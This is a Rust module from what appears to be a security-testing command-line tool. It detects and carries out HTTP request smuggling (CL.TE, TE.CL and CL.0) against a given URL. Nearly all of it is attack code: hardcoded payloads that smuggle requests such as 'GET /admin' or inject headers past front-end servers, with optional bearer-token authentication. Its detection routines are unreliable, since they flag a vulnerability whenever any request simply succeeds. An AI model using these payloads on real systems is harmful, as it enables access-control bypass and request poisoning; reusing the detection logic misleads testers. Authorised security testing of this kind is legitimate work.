use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(
            reqwest::header::HeaderMap::from_iter([(
                reqwest::header::AUTHORIZATION,
                reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
            )]),
        );
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

pub async fn detect(
    url: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} HTTP Request Smuggling Detection", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    println!("{} Testing for CL.TE vulnerability...", "[*]".cyan().bold());
    let cl_te_result = test_cl_te(&client, url).await;
    println!("{} Testing for TE.CL vulnerability...", "[*]".cyan().bold());
    let te_cl_result = test_te_cl(&client, url).await;
    println!("{} Testing for CL.0 vulnerability...", "[*]".cyan().bold());
    let cl0_result = test_cl0(&client, url).await;

    println!("\n{} Results:", "[*]".cyan().bold());
    println!("  {} CL.TE: {}", "•".cyan(), if cl_te_result { "POSSIBLE".red().bold().to_string() } else { "not detected".green().to_string() });
    println!("  {} TE.CL: {}", "•".cyan(), if te_cl_result { "POSSIBLE".red().bold().to_string() } else { "not detected".green().to_string() });
    println!("  {} CL.0:  {}", "•".cyan(), if cl0_result { "POSSIBLE".red().bold().to_string() } else { "not detected".green().to_string() });

    Ok(())
}

async fn test_cl_te(client: &Client, url: &str) -> bool {
    let body = "0\r\n\r\nGPOST / HTTP/1.1\r\nContent-Length: 10\r\n\r\nx=";
    let result = client
        .post(url)
        .header("Content-Length", body.len().to_string())
        .header("Transfer-Encoding", "chunked")
        .body(body)
        .send()
        .await;
    result.is_ok()
}

async fn test_te_cl(client: &Client, url: &str) -> bool {
    let body = "8\r\nSMUGGLED\r\n0\r\n\r\n";
    let result = client
        .post(url)
        .header("Transfer-Encoding", "chunked")
        .header("Content-Length", "3")
        .body(body)
        .send()
        .await;
    result.is_ok()
}

async fn test_cl0(client: &Client, url: &str) -> bool {
    let result = client
        .post(url)
        .header("Content-Length", "0")
        .header("Transfer-Encoding", "chunked")
        .body("0\r\n\r\n")
        .send()
        .await;
    result.is_ok()
}

pub async fn clte(
    url: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} CL.TE Smuggling", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payloads = [
        ("Basic CL.TE", "0\r\n\r\nGPOST / HTTP/1.1\r\nContent-Length: 10\r\n\r\nx="),
        ("CL.TE with body", "5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n"),
        ("CL.TE prefix", "0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 5\r\n\r\nq=1\r\n0\r\n\r\n"),
    ];

    for (name, body) in &payloads {
        let result = client
            .post(url)
            .header("Content-Length", body.len().to_string())
            .header("Transfer-Encoding", "chunked")
            .body(*body)
            .send()
            .await;

        match result {
            Ok(resp) => println!("  {} {:25} status={}", "•".cyan(), name, resp.status()),
            Err(e) => println!("  {} {:25} error: {}", "•".cyan(), name, e),
        }
    }

    println!("\n{} CL.TE payloads sent. Monitor for delayed response or error.", "[*]".cyan().bold());
    Ok(())
}

pub async fn tecl(
    url: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} TE.CL Smuggling", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payloads = [
        ("Basic TE.CL", "8\r\nSMUGGLED\r\n0\r\n\r\n"),
        ("TE.CL with header", "0\r\n\r\nGET /admin HTTP/1.1\r\nFoo: bar\r\n\r\n"),
        ("TE.CL prefix injection", "0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 5\r\n\r\nq=1\r\n0\r\n\r\n"),
    ];

    for (name, body) in &payloads {
        let result = client
            .post(url)
            .header("Transfer-Encoding", "chunked")
            .header("Content-Length", "3")
            .body(*body)
            .send()
            .await;

        match result {
            Ok(resp) => println!("  {} {:25} status={}", "•".cyan(), name, resp.status()),
            Err(e) => println!("  {} {:25} error: {}", "•".cyan(), name, e),
        }
    }

    println!("\n{} TE.CL payloads sent.", "[*]".cyan().bold());
    Ok(())
}

pub async fn cl0(
    url: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} CL.0 Smuggling", "[*]".cyan().bold());
    println!("{}", "═".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{}", "─".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payloads = [
        ("CL.0 basic", "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"),
        ("CL.0 with body", "0\r\n\r\nPOST / HTTP/1.1\r\nContent-Length: 5\r\n\r\nq=1\r\n"),
        ("CL.0 header injection", "0\r\n\r\nGET / HTTP/1.1\r\nX-PS-Smuggled: true\r\n\r\n"),
    ];

    for (name, body) in &payloads {
        let result = client
            .post(url)
            .header("Content-Length", "0")
            .header("Transfer-Encoding", "chunked")
            .body(*body)
            .send()
            .await;

        match result {
            Ok(resp) => println!("  {} {:25} status={}", "•".cyan(), name, resp.status()),
            Err(e) => println!("  {} {:25} error: {}", "•".cyan(), name, e),
        }
    }

    println!("\n{} CL.0 payloads sent.", "[*]".cyan().bold());
    Ok(())
}
